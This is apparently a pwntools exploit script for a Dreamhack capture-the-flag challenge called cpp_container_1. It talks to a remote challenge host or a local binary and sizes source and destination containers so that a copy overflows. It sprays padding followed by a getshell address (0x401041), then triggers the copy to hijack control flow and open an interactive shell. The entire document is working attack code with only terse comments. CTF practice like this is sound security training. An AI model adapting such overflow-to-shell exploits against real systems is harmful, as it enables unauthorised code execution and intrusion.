from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/cpp_container1/cpp_container_1')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:23865'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
getshell =  0x401041

#first, resize src

p.recvuntil(b": ")
p.sendline(b"2")

#size src
p.recvuntil(b"size\n")
p.sendline(b"10")

#dest size
p.recvuntil(b"size\n")
p.sendline(b"3")

#populate
p.recvuntil(b": ")
p.sendline(b"1")

for _ in range(0,8):
    p.recvuntil(b": ")
    p.sendline(str(0x41414141))
    
    
p.recvuntil(b": ")
p.sendline(str(getshell))
 
p.recvuntil(b": ")
p.sendline(str(0x0))


for _ in range(0,3):
    p.recvuntil(b": ")
    p.sendline(b"1")

#now copy
p.recvuntil(b": ")
p.sendline(b"3")

p.interactive()
